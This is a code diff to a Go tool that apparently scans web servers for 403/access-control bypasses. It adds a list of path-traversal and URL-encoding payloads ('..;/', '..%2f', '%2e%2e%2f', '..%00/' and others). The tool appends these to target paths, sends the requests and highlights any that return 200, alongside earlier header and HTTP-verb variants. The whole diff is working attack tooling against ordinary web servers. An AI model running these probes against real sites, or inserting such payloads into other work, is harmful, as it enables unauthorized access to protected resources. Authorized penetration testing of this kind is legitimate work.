@@ -65,6 +65,13 @@ func main() {
 		{"HTTP": "TRACE"},
 	}
 
+	payloadsList := []string{
+		"/", "/*", "/%2f/", "/./", "./.", "/*/", "?", "??", "&",
+		"#", "%", "%20", "%09", "/..;/", "../", "..%2f", "..;/",
+		".././", "..%00/", "..%0d", "..%5c", "..%ff/", "%2e%2e%2f",
+		".%2e/", "%3f", "%26", "%23", ".json",
+	}
+
 	urls := readUrlsFromInput(urlPtr, filePtr)
 	for i, pUrl := range urls {
 		parsedURL, err := url.Parse(pUrl)
@@ -77,15 +84,46 @@ func main() {
 		for _, headers := range headersList {
 			verb := getVerb(headers)
 			headers = replacePlaceholders(headers, sUrl, sPath)
-			req := createRequest(verb, pUrl, headers)
+			req := createRequest(verb, pUrl)
+
+			if req == nil {
+				continue
+			}
+
+			for k, v := range headers {
+				req.Header.Add(k, v)
+			}
 
 			resp, err := http.DefaultClient.Do(req)
 			if err != nil {
 				fmt.Println(err, i)
-				return
+				continue
 			}
 
-			printOutput(resp.StatusCode, verb, sUrl, sPath, headers)
+			printOutputWithHeaders(resp.StatusCode, verb, sUrl, sPath, headers)
+
+			resp.Body.Close()
+		}
+
+		for i, payload := range payloadsList {
+			verb := "GET"
+			if sPath == "" {
+				sPath = "/"
+			}
+			loadedUrl := fmt.Sprintf("%s%s%s", sUrl, sPath, payload)
+			req := createRequest(verb, loadedUrl)
+
+			if req == nil {
+				continue
+			}
+
+			resp, err := http.DefaultClient.Do(req)
+			if err != nil {
+				fmt.Println(i, err)
+				continue
+			}
+
+			printOutput(resp.StatusCode, verb, loadedUrl)
 
 			resp.Body.Close()
 		}
@@ -186,21 +224,32 @@ func replacePlaceholders(headers map[string]string, sUrl, sPath string) map[stri
 	return headers
 }
 
-func createRequest(verb string, pUrl string, headers map[string]string) *http.Request {
+func createRequest(verb string, pUrl string) *http.Request {
 	req, err := http.NewRequest(verb, pUrl, nil)
+
 	if err != nil {
 		fmt.Println(err)
 		return nil
 	}
+
 	return req
 }
 
-func printOutput(statusCode int, verb string, url string, path string, headers map[string]string) {
+func printOutputWithHeaders(statusCode int, verb string, url string, path string, headers map[string]string) {
 	// Print in green if it's 200
 	if statusCode == 200 {
 		fmt.Printf("\033[32m%d => HTTP %s %s%s %v\033[0m\n", statusCode, verb, url, path, headers)
 	} else {
 		fmt.Printf("\033[31m%d => HTTP %s %s%s %v\033[0m\n", statusCode, verb, url, path, headers)
+	}
+}
+
+func printOutput(statusCode int, verb string, url string) {
+	// Print in green if it's 200
+	if statusCode == 200 {
+		fmt.Printf("\033[32m%d => HTTP %s %s\033[0m\n", statusCode, verb, url)
+	} else {
+		fmt.Printf("\033[31m%d => HTTP %s %s\033[0m\n", statusCode, verb, url)
 	}
 }
 
